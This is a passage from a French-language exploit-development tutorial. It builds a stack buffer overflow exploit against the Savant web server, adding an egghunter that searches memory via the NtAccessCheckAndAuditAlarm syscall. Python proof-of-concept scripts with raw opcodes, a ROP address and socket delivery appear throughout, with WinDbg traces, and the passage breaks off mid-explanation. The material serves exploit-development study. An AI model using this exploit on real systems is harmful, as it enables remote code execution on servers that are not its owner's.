<li>Ceci aura pour effet de mettre <code>ECX</code> a <code>0</code></li> </ul> </li> <li>Utiliser l'instruction <code>TEST</code> avec <code>ECX</code> dans les deux op\u00e9randes<ul> <li>Ce qui va positionner <code>ZF</code> a <code>1</code></li> </ul> </li> </ul> <p>The XOR instruction does a bitwise operation. The resultant bit is set to 1 only if the bit from the other operand is different. Using the XOR bitwise operation with the same destination and source will always result in 0. This is a common way to null a register. We chose to use the ECX register for our XOR operation, using other registers will produce the same result.</p> <p>The TEST performs a bit-wise logical AND operation and sets the ZF (amongst others) according to the result. The AND operation sets each bit to 1 if both corresponding bits of the operands are 1, otherwise, it is set to 0.</p> <p>G\u00e9n\u00e9ration des opcodes correspondants :</p> <pre><code>$ msf-nasm_shell\nnasm &gt; xor ecx, ecx\n00000000  31C9              xor ecx,ecx\nnasm &gt; test ecx, ecx\n00000000  85C9              test ecx,ecx\nnasm &gt; je 0x17\n00000000  0F8411000000      jz near 0x17              # JE et JZ sont interchangeable\n</code></pre> <p>Pas de mauvais caract\u00e8re dans les opcodes g\u00e9n\u00e8res par ces instructions, sauf le <code>je</code> qui contient des null bytes. Pas probl\u00e9matique, car l'espace m\u00e9moire est mis \u00e0 <code>000000</code> avant que la m\u00e9thode <code>HTTP</code> soit copi\u00e9e dedans. En t\u00e9moigne <code>0464ea84  43434343 43434343 00000000 00000000  CCCCCCCC........</code>. On peut donc ignorer les <code>000000</code> g\u00e9n\u00e8res par l'instruction <code>je</code> et utiliser ceux d\u00e9j\u00e0 pr\u00e9sents en m\u00e9moire.</p> <p>Mise \u00e0 jour de la preuve de concept :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 80\n  size = 253\n\n  httpMethod = b\"\\x31\\xC9\\x85\\xC9\\x0F\\x84\\x11\" + b\" /\" # XOR ECX ECX; TEST ECX ECX; JE 0x17\n  inputBuffer = b\"\\x41\" * size\n  inputBuffer += pack(\"&lt;L\", (0x418674)) # 0x00418674 : POP EAX ; RET\n  httpEndRequest = b\"\\r\\n\\r\\n\"\n\n  buf = httpMethod + inputBuffer +  httpEndRequest\n\n  print(\"Sending buffer...\")\n</code></pre> <p>Ex\u00e9cution de la preuve de concept et positionnement d'un point d'arr\u00eat sur l'adresse o\u00f9 se trouve la s\u00e9rie d'instructions <code>POP EAX;RET</code> :</p> <pre><code>0:009&gt; bp 0x00418674\n#\n0:009&gt; g\nBreakpoint 0 hit\neax=00000000\n00418674 58              pop     eax\n#\n0:004&gt; t\neax=022ffe70\n00418675 c3              ret\n#\n0:004&gt; u poi(@esp) L3\n022fea84 31c9            xor     ecx,ecx\n022fea86 85c9            test    ecx,ecx\n022fea88 0f8411000000    je      022fea9f\n</code></pre> <ul> <li>On affiche le registre <code>ZF</code> juste apres le <code>XOR</code> et le <code>TEST</code><ul> <li>Le registre est bien a <code>1</code></li> </ul> </li> <li>On execute l'instruction de saut conditionnel <code>JE</code></li> <li>On voit que <code>EIP</code> est bien initialise a <code>022fea9f</code><ul> <li>Le flot d'execution est bien redirige suite au <code>je</code></li> </ul> </li> <li><code>EIP</code> pointe bien sur le buffer de <code>0x41</code></li> </ul> <pre><code>0:004&gt; t\n[...]\n022fea84 31c9            xor     ecx,ecx\n#\n0:004&gt; t\n[...]\n022fea86 85c9            test    ecx,ecx\n#\n0:004&gt; r @zf\nzf=1\n#\n0:004&gt; dd 022fea9f - 4\n022fea9b  41412f00 41414141 41414141 41414141\n022feaab  41414141 41414141 41414141 41414141\n[...]\n# Le `2f00` correspond a `./`\n0:004&gt; dc 022fea9f - 4\n022fea9b  41412f00 41414141 41414141 41414141  ./AAAAAAAAAAAAAA\n022feaab  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n[...]\n#\n0:004&gt; t\neip=022fea88\n022fea88 0f8411000000    je      022fea9f                                [br=1]\n#\n0:004&gt; t\neip=022fea9f\n022fea9f 41              inc     ecx\n#\n0:004&gt; u @eip\n022fea9f 41              inc     ecx\n022feaa0 41              inc     ecx\n022feaa1 41              inc     ecx\n[...]\n</code></pre> <p>Le buffer de <code>0x41</code> fait 251 bytes, ce qui est trop petit pour un shellcode de reverse shell (environ 300 bytes) et beaucoup trop petit pour un shellcode de Meterpreter.</p> <p>On pourrait utiliser un plus petit shellcode ou trouver un moyen de stocker un shellcode plus grand.</p>"},{"location":"binary-exploitation/3-egghunters/#trouver-de-lespace-supplementaire","title":"Trouver de l'espace suppl\u00e9mentaire","text":"<p>L'espace du payload \u00e9tant limit\u00e9, il faut trouver un buffer additionnel dans une autre r\u00e9gion de la m\u00e9moire avant le crash et de rediriger le flot d'ex\u00e9cution vers ce buffer. Si on arrive \u00e0 stocker un buffer plus large ailleurs on peut utiliser le premier  buffer pour \u00e9crire un shellcode de type stage one. L'objectif de ce shellcode sera de rediriger le flot d'ex\u00e9cution vers le deuxi\u00e8me buffer ou on aura assez de place pour stocker un payload plus large.</p> <p>Pour d\u00e9terminer ce qui va \u00eatre stocke dans la m\u00e9moire de notre application</p> <ul> <li>Soit faire du reverse engineering</li> <li>Soit faire des suppositions base sur le type d'application</li> </ul> <p>On essaye de trouver un espace suppl\u00e9mentaire en ajoutant un buffer apr\u00e8s la fin de la requ\u00eate <code>HTTP</code> \u00e0 travers la variable <code>shellcode</code> :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 80\n  size = 253\n\n  httpMethod = b\"\\x31\\xC9\\x85\\xC9\\x0F\\x84\\x11\" + b\" /\" # XOR ECX ECX; TEST ECX ECX; JE 0x17\n  inputBuffer = b\"\\x41\" * size\n  inputBuffer += pack(\"&lt;L\", (0x418674)) # 0x00418674 : POP EAX ; RET\n  httpEndRequest = b\"\\r\\n\\r\\n\"\n\n  shellcode = b\"w00tw00t\" + b\"\\x44\" * 400\n\n  buf = httpMethod + inputBuffer +  httpEndRequest + shellcode\n</code></pre> <p>Ex\u00e9cution de la preuve de concept et positionnement d'un point d'arr\u00eat sur l'adresse o\u00f9 se trouve la s\u00e9rie d'instructions <code>POP EAX;RET</code> :</p> <ul> <li>On trouve le pattern <code>w00tw00t</code> une seule fois en m\u00e9moire</li> </ul> <pre><code>0:009&gt; bp 0x00418674\n#\n0:009&gt; g\nBreakpoint 0 hit\n[...]\n00418674 58              pop     eax\n0:004&gt; s -a 0x0 L?80000000 w00tw00t\n01965aa6  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD\n#\n0:004&gt; db 01965aa6 + 0n408 - 4 L4\n01965c3a  44 44 44 44                                      DDDD\n</code></pre> <p>On a donc identifi\u00e9 avec succ\u00e8s un second buffer on l'on va pouvoir stocker notre shellcode final.</p>"},{"location":"binary-exploitation/3-egghunters/#gestionnaire-de-tas-windows","title":"Gestionnaire de Tas Windows","text":"<p>On a trouve notre pattern a l'adresse m\u00e9moire <code>01965aa6</code>. Cependant, si on affiche la pile via <code>!teb</code> on se rend compte que l'adresse n'est pas dans la pile. On utilise la commande <code>!address</code> pour obtenir des informations sur l'adresse fournie en param\u00e8tre. L'adresse est pr\u00e9sente sur la <code>heap</code> (tas) :</p> <pre><code>#\n0:004&gt; s -a 0x0 L?80000000 w00tw00t\n01965aa6  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD\n#\n0:004&gt; !teb\nTEB at 00385000\n    ExceptionList:        046cff70\n    StackBase:            046d0000\n    StackLimit:           046cc000\n[...]\n0:004&gt; !address 01965aa6                 \n[...]\nUsage:                  Heap\nBase Address:           01960000\nEnd Address:            0196f000\n[...]\n</code></pre> <p>Le Windows Heap Memory Manager est une couche logicielle qui se situe au-dessus des interfaces de la m\u00e9moire virtuelle fournies par Windows. Cet outil permet aux applications de demander et rel\u00e2cher dynamiquement de la m\u00e9moire \u00e0 travers un panel d'API Windows (<code>VirtualAllocEx</code> <code>VirtualFreeEx</code> - <code>HeapAlloc</code> -  <code>HeapFree</code>).</p> <p>Dans Windows, quand un nouveau processus se lance, le <code>Heap Manager</code> va automatiquement cr\u00e9er une nouvelle <code>heap</code> appellee default process heap. \u00c0 haut niveau, les <code>heap</code> sont de gros morceaux de m\u00e9moire qui sont divis\u00e9s en petit morceau pour r\u00e9pondre aux demandes dynamiques d'allocation m\u00e9moire.</p> <p>Certain processus n'utilisent que le default process heap mais la plupart vont en cr\u00e9er de nouveaux avec l'API <code>HeapCreate</code> ou <code>ntdll!RtlCreateHeap</code> pour isoler des composants s'ex\u00e9cutant dans un m\u00eame processus. Certains processus utilise C Runtime Heap pour la plupart de leurs allocations dynamiques (<code>malloc</code> - <code>free</code>). Ces fonctions vont \u00e0 terme utiliser les fonctions du Heap Manager de NTDLL qui fait le lien avec le noyau Windows (Windows Virtual Memory Manager).</p> <p>Du fait que notre buffer est stock\u00e9 dans une m\u00e9moire dynamique, il n'est pas possible de d\u00e9terminer sa localisation en avance. D'autres techniques doivent \u00eatre utilis\u00e9es pour trouver notre buffer.</p>"},{"location":"binary-exploitation/3-egghunters/#lapproche-egg-hunter","title":"L'approche Egg Hunter","text":"<p>Quand on doit trouver l'adresse m\u00e9moire d'un autre buffer sous notre contr\u00f4le dont l'adresse n'est pas statique on utilise des egghunter.</p>"},{"location":"binary-exploitation/3-egghunters/#keystone-engine","title":"Keystone Engine","text":"<p>\u00c9crire du shellcode est simplifie avec l'utilisation d'outil tel que Keystone Engine qui est un framework assembleur. Il fait le lien avec diff\u00e9rent langage de programmation tel que Python. On peut l'utiliser pour \u00e9crire de l'assembleur directement dans le code Python.</p> <p>Exemple de code Python contenant du code assembleur :</p> <pre><code># Import de tous les \u00e9l\u00e9ments de la librairie\nfrom keystone import *\n\n# D\u00e9claration de la variable `CODE` qui contient du code assembleur\nCODE = (\n\"                       \"\n\" start:                \"\n\"       xor eax, eax   ;\"\n\"       add eax, ecx   ;\"\n\"       push eax       ;\"\n\"       pop esi        ;\"\n)\n\n# Initialisation du `Keystone Engine` qui prend deux param\u00e8tres : l'architecture et le mode\nks = Ks(KS_ARCH_X86, KS_MODE_32)\n\n# Compilation des instructions assembleur\n# La fonction `asm` renvoie une liste de byte encodes et le nombre d'instructions compil\u00e9es\nencoding, count = ks.asm(CODE)\n\ninstructions = \"\"\n\n# It\u00e9ration sur les bytes\nfor dec in encoding:\n    # Stockage au format python shellcode\n    instructions += \"\\\\x{0:02x}\".format(int(dec)).rstrip(\"\\n\")\n\nprint(\"Opcodes = (\\\"\" + instructions + \"\\\")\")\n</code></pre> <p>R\u00e9sultat \u00e0 l'ex\u00e9cution :</p> <pre><code>$ python keystone-poc.py                      \nOpcodes = (\"\\x31\\xc0\\x01\\xc8\\x50\\x5e\")\n</code></pre> <p>On v\u00e9rifie que les opcodes correspondent a ceux g\u00e9n\u00e9r\u00e9s via <code>msf-nasm_shell</code> :</p> <pre><code>$ msf-nasm_shell\nnasm &gt; xor eax,eax\n00000000  31C0              xor eax,eax\nnasm &gt; add eax,ecx\n00000000  01C8              add eax,ecx\nnasm &gt; push eax\n00000000  50                push eax\nnasm &gt; pop esi\n00000000  5E                pop esi\n</code></pre>"},{"location":"binary-exploitation/3-egghunters/#egghunters-et-appels-systeme","title":"Egghunters et appels syst\u00e8me","text":"<p>Un egghunter est un petit payload first-stage qui peut chercher dans le Virtual Address Space (VAS) du processus \u00e0 la recherche du egg. Il va globalement chercher dans tout l'espace m\u00e9moire du programme cible.</p> <p>Un des probl\u00e8mes majeurs est qu'il n'est pas possible de savoir \u00e0 l'avance si un espace m\u00e9moire est mappe ou pas - si on a les acc\u00e8s pour y acc\u00e9der - quel type d'acc\u00e8s est autoris\u00e9 sur cette espace m\u00e9moire. Dans de nombreux cas, on risque de d\u00e9clencher un access violation.</p> <p>L'auteur original de la premi\u00e8re preuve de concept a utilis\u00e9 l'appel syst\u00e8me <code>NtAccessCheckAndAuditAlarm</code> (numero <code>0x2</code>).</p> <p>Un appel syst\u00e8me (system call) est une interface entre espace utilisateur et espace noyau. G\u00e9n\u00e9ralement, appelle \u00e0 travers une instruction ASM d\u00e9di\u00e9e (interupt / trap). Quand un appel syst\u00e8me est appel\u00e9 :</p> <ul> <li>Le programme courant va le signaler au syst\u00e8me d'exploitation et demander \u00e0 ce que l'op\u00e9ration soit r\u00e9alis\u00e9e</li> <li>Le syst\u00e8me d'exploitation prend en charge l'op\u00e9ration en background</li> <li>Le syst\u00e8me d'exploitation redonne la main au logiciel avec le r\u00e9sultat de l'op\u00e9ration</li> </ul> <p>Le egghunter va profiter de ce fonctionnement. Plut\u00f4t que de parcourir la m\u00e9moire au sein du programme et de risquer un access violation on utilise un appel syst\u00e8me afin de laisser le syst\u00e8me d'exploitation acc\u00e9der aux adresses m\u00e9moires. Avant que la fonction soit appel\u00e9e, le syst\u00e8me d'exploitation va copier les arguments fournis dans l'espace utilisateur vers l'espace noyau.</p> <p>Si l'adresse m\u00e9moire n'est pas mapp\u00e9e ou qu'on ne poss\u00e8de pas les bons acc\u00e8s, l'op\u00e9ration de copie va soulever un access violation. Le access violation va \u00eatre g\u00e9r\u00e9 dans le background et renvoyer un code <code>STATUS_ACCESS_VIOLATION</code> (<code>0xc0000005</code>), permettant au egghunter de continuer \u00e0 la prochaine page m\u00e9moire.</p> <p>Afin d'appeler un appel syst\u00e8me, le syst\u00e8me d'exploitation doit connaitre la fonction \u00e0 appeler et les arguments a passer :</p> <ul> <li>Dans architecture <code>x86</code> la fonction est sp\u00e9cifi\u00e9e via un num\u00e9ro d'appel syst\u00e8me unique (System Call Number) qui est positionn\u00e9 au sein du registre <code>EAX</code></li> <li>Depot des arguments sur la pile si la fonction prend des param\u00e8tres</li> <li>Copie du pointeur de pile <code>ESP</code> dans le registre <code>EDX</code> qui est pass\u00e9 en param\u00e8tre \u00e0 l'appel syst\u00e8me</li> </ul> <p>Durant l'appel syst\u00e8me, l'OS va tenter d'acc\u00e9der \u00e0 l'adresse m\u00e9moire ou les arguments de la fonction sont stock\u00e9s pour les copier de l'espace utilisateur \u00e0 l'espace noyau. Si le registre <code>EDX</code> pointe sur une adresse m\u00e9moire non mapp\u00e9e ou \u00e0 laquelle on a pas acc\u00e8s \u00e0 cause d'un manque de permission le syst\u00e8me d'exploitation va d\u00e9clencher un access violation. L' access violation va \u00eatre g\u00e9r\u00e9 pour nous et renvoyer <code>STATUS_ACCESS_VIOLATION</code> dans <code>EAX</code>.</p> <p>En appelant l'appel syst\u00e8me <code>NtAccessCheckAndAuditAlarm</code> on va obtenir seulement deux r\u00e9sultats possibles :</p> <ul> <li>Si l'adresse est valide et qu'on a acc\u00e8s : <code>STATUS_NO_IMPERSONATION_TOKEN</code></li> <li>Si l'adresse est non mapp\u00e9e ou qu'on a a pas acc\u00e8s : <code>STATUS_ACCESS_VIOLATION</code></li> </ul> <p>Analyse en d\u00e9tail du code assembleur de la preuve de concept original de egghunter :</p> <pre><code>#\n#\n\" loop_inc_page:    \"\n  # Operation `OR` sur le registre `DX` (`EDX`)\n  # Va faire pointer `EDX` sur la derni\u00e8re adresse de la page m\u00e9moire\n\"  or dx, 0x0fff  ;\" \n#\n#\n\" loop_inc_one:    \"\n  # Operation `INC` sur le registre `EDX`\n  # Incr\u00e9menter `EDX` de `1` pour pointer sur une nouvelle page m\u00e9moire\n\"  inc edx    ;\"\n</code></pre> <p>Le registre <code>EDX</code> contient maintenant l'adresse de la prochaine page m\u00e9moire.</p> <pre><code>#\n#\n\" loop_check:     \"\n  # On positionne le contenu du registre `EDX` sur la pile\n  # Non n\u00e9cessaire, mais permet d'assurer une sauvegarde, car on ne peut pas garantir que EDX sera restaur\u00e9 a la suite de l'appel syst\u00e8me\n\"  push edx   ;\"\n  # On positionne `0x2` sur la pile. 0x2 est le num\u00e9ro de l'appel syst\u00e8me NtAccessCheckAndAuditAlarm\n\"  push 0x2    ;\" \n  # On positionne le dernier \u00e9l\u00e9ment de la pile (`pop`) qui est donc `0x2` qu'on vient de mettre dans la pile dans le registre `EAX`\n  # Le num\u00e9ro de l'appel syst\u00e8me est dans `EAX`\n\"  pop eax    ;\" \n  # Le num\u00e9ro de l'appel syst\u00e8me est dans `EAX` et `EDX` contient un faux pointeur\n  # On invoque l'appel syst\u00e8me va `INT`\n\"  int 0x2e   ;\" \n</code></pre> <p>Le syst\u00e8me d'exploitation va invoquer l'appel syst\u00e8me. Durant cet appel il va v\u00e9rifier l'adresse m\u00e9moire stock\u00e9e dans <code>EDX</code> pour r\u00e9cup\u00e9rer les arguments de la fonction. Si l'acc\u00e8s a cette adresse stock\u00e9e dans <code>EDX</code> entraine un access violation on obtiendra le statut <code>STATUS_ACCESS_VIOLATION</code> (<code>0xc0000005</code>) dans <code>EAX</code>.</p> <p>Le prochain morceau de code va analyser le retour de l'appel syst\u00e8me :</p> <pre><code>  # On compare `AL` (registre du bas de `EAX`) avec `05` pour \u00e9viter le *null bytes*\n\"  cmp al,05   ;\" \n  # On restaure l'adresse m\u00e9moire depuis la pile dans `EDX`\n\"  pop edx    ;\" \n#\n#\n\" loop_check_valid:   \"\n  # Jump conditionnel qui va se baser sur le r\u00e9sultat de l'op\u00e9ration `CMP`\n    # Si un `STATUS_ACCESS_VIOLATION` a \u00e9t\u00e9 trouv\u00e9, on se d\u00e9place \u00e0 la prochaine page m\u00e9moire en faisant un jump vers le d\u00e9but de notre script pour refaire les \u00e9tapes pr\u00e9c\u00e9dentes\n    # Si la m\u00e9moire est mapp\u00e9e ou qu'on a acc\u00e8s on continue pour aller v\u00e9rifier notre signature unique (*egg*)\n\"  je loop_inc_page ;\"\n</code></pre> <p>On arrive ici si la m\u00e9moire est mapp\u00e9e ou qu'on a acc\u00e8s \u00e0 la recherche de notre egg :</p> <pre><code>#\n#\n\" is_egg:      \"\n  # On place note *egg* (ici `w00t` mais \u00e7a pourrait \u00eatre autre chose) dans le registre `EAX`\n\"  mov eax, 0x74303077 ;\" \n  # On copie l'adresse pr\u00e9sente dans `EDX` dans `EDI`\n\"  mov edi, edx  ;\" \n  # Compare la valeur stock\u00e9e dans `EAX` avec le 1er DWORD de l'adresse m\u00e9moire sur laquelle pointe `EDI` (qui contient maintenant l'adresse stock\u00e9e dans `EDX` \u00e0 laquelle l'appel syst\u00e8me a pu acc\u00e9der)\n  # On v\u00e9rifie ainsi si l'adresse mapp\u00e9e identifi\u00e9e via l'appel syst\u00e8me contient l'*egg* ou pas\n    # Mets \u00e0 jour le registre `ZF` en fonction du r\u00e9sultat de la comparaison\n    # Incr\u00e9menter automatiquement `EDI` de 1 DWORD\n\"  scasd    ;\" \n  # Jump conditionnel d\u00e9pendant du r\u00e9sultat de la comparaison via `scasd`\n    # Si le 1er DWORD du *egg* n'est pas trouv\u00e9 on jump a `loop_inc_one` pour repeter le processus de recherche en incr\u00e9mentant l'adresse m\u00e9moire de un\n    # Si le 1er DWORD est trouve on va r\u00e9utiliser SCASD pour chercher le deuxi\u00e8me DWORD de notre egg\n\"  jnz loop_inc_one ;\" \n</code></pre> <p>On arrive ici si on a trouv\u00e9 le premier DWORD de notre egg et qu'on cherche le deuxi\u00e8me :</p> <pre><code>  # Compare de nouveau `EAX` mais avec le 2em DWORD de `EDI` (\u00e0 la suite de l'incr\u00e9mentation du premier `SCASD`)\n\"  scasd    ;\" \n  # Jump conditionnel d\u00e9pendant du r\u00e9sultat de la comparaison via `scasd`\n    # Si le 2em DWORD du *egg* n'est pas trouv\u00e9 on jump a `loop_inc_one` pour r\u00e9p\u00e9ter le processus\n    # Si le 2em DWORD est trouve on continue\n\"  jnz loop_inc_one ;\" \n#\n#\n\" matched:     \"\n  # On jump sur `EDI` qui contient donc l'*egg* puisque les 2 DWORD sont pr\u00e9sents\n\"  jmp edi    ;\" \n</code></pre> <p>Code complet :</p> <pre><code>from keystone import *\n\nCODE = (\n#\n#\n\" loop_inc_page:    \"\n  # Operation `OR` sur le registre `DX` (`EDX`)\n  # Va faire pointer `EDX` sur la derni\u00e8re adresse de la page m\u00e9moire\n\"  or dx, 0x0fff  ;\" \n#\n#\n\" loop_inc_one:    \"\n  # Operation `INC` sur le registre `EDX`\n  # Incr\u00e9menter `EDX` de `1` pour pointer sur une nouvelle page m\u00e9moire\n\"  inc edx    ;\"  \n#\n#\n\" loop_check:     \"\n  # On positionne le contenu du registre `EDX` sur la pile\n  # Non n\u00e9cessaire, mais permet d'assurer une sauvegarde, car on ne peut pas garantir que EDX sera restaur\u00e9 a la suite de l'appel syst\u00e8me\n\"  push edx   ;\"\n  # On positionne `0x2` sur la pile. 0x2 est le num\u00e9ro de l'appel syst\u00e8me NtAccessCheckAndAuditAlarm\n\"  push 0x2    ;\" \n  # On positionne le dernier \u00e9l\u00e9ment de la pile (`pop`) qui est donc `0x2` qu'on vient de mettre dans la pile dans le registre `EAX`\n  # Le num\u00e9ro de l'appel syst\u00e8me est dans `EAX`\n\"  pop eax    ;\" \n  # Le num\u00e9ro de l'appel syst\u00e8me est dans `EAX` et `EDX` contient un faux pointeur\n  # On invoque l'appel syst\u00e8me va `INT`\n\"  int 0x2e   ;\" \n  # On compare `AL` (registre du bas de `EAX`) avec `05` pour \u00e9viter le *null bytes*\n\"  cmp al,05   ;\" \n  # On restaure l'adresse m\u00e9moire depuis la pile dans `EDX`\n\"  pop edx    ;\" \n#\n#\n\" loop_check_valid:   \"\n  # Jump conditionnel qui va se baser sur le r\u00e9sultat de l'op\u00e9ration `CMP`\n    # Si un `STATUS_ACCESS_VIOLATION` a \u00e9t\u00e9 trouv\u00e9, on se d\u00e9place \u00e0 la prochaine page m\u00e9moire en faisant un jump vers le d\u00e9but de notre script pour refaire les \u00e9tapes pr\u00e9c\u00e9dentes\n    # Si la m\u00e9moire est mapp\u00e9e ou qu'on a acc\u00e8s on continue pour aller v\u00e9rifier notre signature unique (*egg*)\n\"  je loop_inc_page ;\"\n#\n#\n\" is_egg:      \"\n  # On place note *egg* (ici `w00t` mais \u00e7a pourrait \u00eatre autre chose) dans le registre `EAX`\n\"  mov eax, 0x74303077 ;\" \n  # On copie l'adresse pr\u00e9sente dans `EDX` dans `EDI`\n\"  mov edi, edx  ;\" \n  # Compare la valeur stock\u00e9e dans `EAX` avec le 1er DWORD de l'adresse m\u00e9moire sur laquelle pointe `EDI` (qui contient maintenant l'adresse stock\u00e9e dans `EDX` \u00e0 laquelle l'appel syst\u00e8me a pu acc\u00e9der)\n  # On v\u00e9rifie ainsi si l'adresse mapp\u00e9e identifi\u00e9e via l'appel syst\u00e8me contient l'*egg* ou pas\n    # Mets \u00e0 jour le registre `ZF` en fonction du r\u00e9sultat de la comparaison\n    # Incr\u00e9menter automatiquement `EDI` de 1 DWORD\n\"  scasd    ;\" \n  # Jump conditionnel d\u00e9pendant du r\u00e9sultat de la comparaison via `scasd`\n    # Si le 1er DWORD du *egg* n'est pas trouv\u00e9 on jump a `loop_inc_one` pour repeter le processus de recherche en incr\u00e9mentant l'adresse m\u00e9moire de un\n    # Si le 1er DWORD est trouve on va r\u00e9utiliser SCASD pour chercher le deuxi\u00e8me DWORD de notre egg\n\"  jnz loop_inc_one ;\" \n  # Compare de nouveau `EAX` mais avec le 2em DWORD de `EDI` (\u00e0 la suite de l'incr\u00e9mentation du premier `SCASD`)\n\"  scasd    ;\" \n  # Jump conditionnel d\u00e9pendant du r\u00e9sultat de la comparaison via `scasd`\n    # Si le 2em DWORD du *egg* n'est pas trouv\u00e9 on jump a `loop_inc_one` pour r\u00e9p\u00e9ter le processus\n    # Si le 2em DWORD est trouve on continue\n\"  jnz loop_inc_one ;\" \n#\n#\n\" matched:     \"\n  # On jump sur `EDI` qui contient donc l'*egg* puisque les 2 DWORD sont pr\u00e9sents\n\"  jmp edi    ;\"   \n)\n\n# Initialize engine in 32bit mode\nks = Ks(KS_ARCH_X86, KS_MODE_32)\nencoding, count = ks.asm(CODE)\negghunter = \"\"\nfor dec in encoding: \n  egghunter += \"\\\\x{0:02x}\".format(int(dec)).rstrip(\"\\n\")\n\nprint(\"egghunter = (\\\"\" + egghunter + \"\\\")\")\n</code></pre> <p>Ex\u00e9cution du script complet et g\u00e9n\u00e9ration des opcodes correspondants :</p> <pre><code>$ python3 egghunter.py\negghunter = (\"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\\xef\\xb8\\x77\\x30\\x30\\x74\\x89\\xd7\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7\")\n</code></pre> <p>Mise \u00e0 jour de la preuve de concept en int\u00e9grant les opcodes g\u00e9n\u00e9r\u00e9s :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 80\n  size = 253\n\n  httpMethod = b\"\\x31\\xC9\\x85\\xC9\\x0F\\x84\\x11\" + b\" /\" # XOR ECX ECX; TEST ECX ECX; JE 0x17\n\n  egghunter = (b\"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\"  # NOP sled\n               b\"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\"\n               b\"\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\"\n               b\"\\xef\\xb8\\x77\\x30\\x30\\x74\\x89\\xd7\"\n               b\"\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7\")\n\n  inputBuffer = b\"\\x41\" * (size - len(egghunter))\n  inputBuffer += pack(\"&lt;L\", (0x418674)) # 0x00418674 : POP EAX ; RET\n  httpEndRequest = b\"\\r\\n\\r\\n\"\n\n  shellcode = b\"w00tw00t\" + b\"\\x44\" * 400\n\n  buf = httpMethod + egghunter + inputBuffer +  httpEndRequest + shellcode\n\n  print(\"Sending buffer...\")\n  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s.connect((server, port))\n  s.send(buf)\n  s.close()\n\n  print(\"Done!\")\n\nexcept socket.error:\n  print(\"Could not connect!\")\n</code></pre> <p>On positionne un point d'arr\u00eat sur l'adresse ou se trouve l'instruction <code>POP EAX;RET</code> :</p> <pre><code>0:009&gt; bp 0x00418674\n*** WARNING: Unable to verify checksum for C:\\Savant\\Savant.exe\n</code></pre> <p>On ex\u00e9cute le nouvel exploit et le point d'arr\u00eat est atteint :</p> <pre><code>0:009&gt; g\nBreakpoint 0 hit\neax=00000000 ebx=018d5778 ecx=0000000e edx=77841670 esi=018d5778 edi=0041703c\neip=00418674 esp=0460ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\nSavant+0x18674:\n00418674 58              pop     eax\n</code></pre> <p>On proc\u00e8de \u00e0 l'ex\u00e9cution jusqu'\u00e0 ce qu'un embranchement soit rencontr\u00e9 avec <code>ph</code>.</p> <p>The ph command executes the program until any kind of branching instruction is reached, including conditional or unconditional branches, calls, returns, and system calls.</p> <pre><code>0:004&gt; ph\neax=0460fe70 ebx=018d5778 ecx=00000000 edx=77841670 esi=018d5778 edi=0041703c\neip=0460ea88 esp=0460ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\n0460ea88 0f8411000000    je      0460ea9f                                [br=1]\n#\n# On d\u00e9compile les opcodes \u00e0 l'adresse `0460ea9f`. On retrouve bien les NOP + le code ASM pour le egghunter\n0:004&gt; u 0460ea9f L16\n0460ea9f 90              nop\n0460eaa0 90              nop\n0460eaa1 90              nop\n0460eaa2 90              nop\n0460eaa3 90              nop\n0460eaa4 90              nop\n0460eaa5 6681caff0f      or      dx,0FFFh\n0460eaaa 42              inc     edx\n0460eaab 52              push    edx\n0460eaac 6a02            push    2\n0460eaae 58              pop     eax\n0460eaaf cd2e            int     2Eh\n0460eab1 3c05            cmp     al,5\n0460eab3 5a              pop     edx\n0460eab4 74ef            je      0460eaa5\n0460eab6 b877303074      mov     eax,offset msvcp_win!_CTA2?AVbad_exceptionstd+0x13cab (74303077)\n0460eabb 89d7            mov     edi,edx\n0460eabd af              scas    dword ptr es:[edi]\n0460eabe 75ea            jne     0460eaaa\n0460eac0 af              scas    dword ptr es:[edi]\n0460eac1 75e7            jne     0460eaaa\n0460eac3 ffe7            jmp     edi\n#\n# On recherche notre egg pour confirmer qu'il est bien en m\u00e9moire et on le trouve bien\n0:004&gt; s -a 0x0 L?80000000 w00tw00t\n018d5b2e  77 30 30 74 77 30 30 74-44 44 44 44 44 44 44 44  w00tw00tDDDDDDDD\n#\n# On met un point d'arr\u00eat sur l'adresse ou le `jmp edi` est r\u00e9alis\u00e9\n0:004&gt; bp 0460eac3\n#\n# On relance\n0:004&gt; g\n</code></pre> <p>Le point d'arr\u00eat n'est jamais atteint, Le egghunter tourne, mais ne trouve pas le egg. Pourtout on a bien confirm\u00e9 qu'il est pr\u00e9sent dans la m\u00e9moire via la recherche avec <code>s</code>.</p> <p>Cet exploit fonctionne sur <code>Windows 7</code> mais pas <code>Windows 10</code>. Des changements entre les deux versions ont entrain\u00e9 un dysfonctionnement du egghunter. Il est n\u00e9cessaire de le modifier.</p>"},{"location":"binary-exploitation/3-egghunters/#corriger-lexploit","title":"Corriger l'exploit","text":"<p>On doit analyser notre preuve de concept pour comprendre pourquoi le egghunter ne fonctionne pas. Le point d'\u00e9chec potentiel le plus important est l'appel \u00e0 la fonction <code>NtAccessCheckAndAuditAlarm</code>.</p> <p>Un des points n\u00e9gatifs de mettre le num\u00e9ro de l'appel syst\u00e8me au sein du code (ici <code>0x02</code>) est qu'il peut \u00eatre amen\u00e9 \u00e0 changer. Avant Windows 8 le num\u00e9ro de l'appel syst\u00e8me de 